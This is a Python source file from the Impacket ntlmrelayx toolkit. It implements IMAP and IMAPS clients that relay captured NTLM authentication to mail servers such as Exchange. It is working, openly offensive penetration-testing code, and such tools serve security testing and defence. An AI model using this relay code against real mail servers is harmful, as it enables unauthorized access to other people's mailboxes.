# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# IMAP Protocol Client
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
# Description:
# IMAP client for relaying NTLMSSP authentication to mailservers, for example Exchange
#
import imaplib
import base64
from struct import unpack

from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["IMAPRelayClient","IMAPSRelayClient"]

class IMAPRelayClient(ProtocolClient):
    PLUGIN_NAME = "IMAP"

    def __init__(self, serverConfig, target, targetPort = 143, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.session = imaplib.IMAP4(self.targetHost,self.targetPort)
        self.authTag = self.session._new_tag()
        LOG.debug('IMAP CAPABILITIES: %s' % str(self.session.capabilities))
        if 'AUTH=NTLM' not in self.session.capabilities:
            LOG.error('IMAP server does not support NTLM authentication!')
            return False
        return True

    def sendNegotiate(self,negotiateMessage):
        negotiate = base64.b64encode(negotiateMessage)
        self.session.send('%s AUTHENTICATE NTLM%s' % (self.authTag,imaplib.CRLF))
        resp = self.session.readline().strip()
        if resp != '+':
            LOG.error('IMAP Client error, expected continuation (+), got %s ' % resp)
            return False
        else:
            self.session.send(negotiate + imaplib.CRLF)
        try:
            serverChallengeBase64 = self.session.readline().strip()[2:] #first two chars are the continuation and space char
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from IMAP server')
            raise

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        auth = base64.b64encode(token)
        self.session.send(auth + imaplib.CRLF)
        typ, data = self.session._get_tagged_response(self.authTag)
        if typ == 'OK':
            self.session.state = 'AUTH'
            return None, STATUS_SUCCESS
        else:
            LOG.error('IMAP: %s' % ' '.join(data))
            return None, STATUS_ACCESS_DENIED

    def killConnection(self):
        if self.session is not None:
            self.session.logout()
            self.session = None

    def keepAlive(self):
        # Send a NOOP
        self.session.noop()

class IMAPSRelayClient(IMAPRelayClient):
    PLUGIN_NAME = "IMAPS"

    def __init__(self, serverConfig, targetHost, targetPort = 993, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, targetHost, targetPort, extendedSecurity)

    def initConnection(self):
        self.session = imaplib.IMAP4_SSL(self.targetHost,self.targetPort)
        self.authTag = self.session._new_tag()
        LOG.debug('IMAP CAPABILITIES: %s' % str(self.session.capabilities))
        if 'AUTH=NTLM' not in self.session.capabilities:
            LOG.error('IMAP server does not support NTLM authentication!')
            return False
        return True
